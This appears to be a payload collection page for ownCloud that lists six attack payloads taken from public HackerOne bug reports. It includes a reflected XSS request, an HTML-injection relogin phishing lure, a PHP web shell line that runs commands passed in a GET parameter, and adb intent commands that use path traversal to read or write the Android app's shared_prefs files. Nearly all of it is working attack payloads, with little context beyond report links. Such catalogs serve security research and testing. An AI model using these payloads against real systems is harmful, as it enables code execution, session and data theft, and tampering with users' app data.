# ownCloud

6 payloads.

### `0eac7df2`

```
curl "https://target.com/content/search.php?PHPSESSID=\">XSSHERE<script>alert(1)</script>"|grep XSS
```

**Parameter:** `PHPSESSID`
— [target.com: Multiple reflected XSS by insecure URL generation (IE only)](https://hackerone.com/reports/83381) · ownCloud · [psych0tr1a](https://hackerone.com/psych0tr1a)

### `1090f85f`

```
"><&#x2f;a><p><center><h1><strong>Important!<&#x2f;strong> Please go to target.com and relogin!<&#x2f;center><&#x2f;h1><&#x2f;p><!--
```

— [HTML injection in Desktop Client](https://hackerone.com/reports/206877) · ownCloud · [lukasreschke](https://hackerone.com/lukasreschke)

### `3706fe73`

```
<?php system($_GET['exec']); ?> // fedef@secsignal.org
```

— [Remote Code Execution through Deserialization Attack in OwnBackup app.](https://hackerone.com/reports/562335) · ownCloud · [q3rv0](https://hackerone.com/q3rv0)

### `91e8d21f`

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml"
```

**Parameter:** `android.intent.extra.STREAM`
— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0

### `6f9261aa`

```
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" -a "android.intent.action.SEND" --es "android.intent.extra.TEXT" "Arbitrary contents here" --es "android.intent.extra.TITLE" "../shared_prefs/test"
```

**Parameter:** `android.intent.extra.TITLE`
— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0

### `ae113368`

```
"file:///data/user/0/com.owncloud.android/cache/../shared_prefs/com.owncloud.android_preferences.xml"
```

— [GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)](https://hackerone.com/reports/1650270) · ownCloud · [atorralba](https://hackerone.com/atorralba) · $50.0
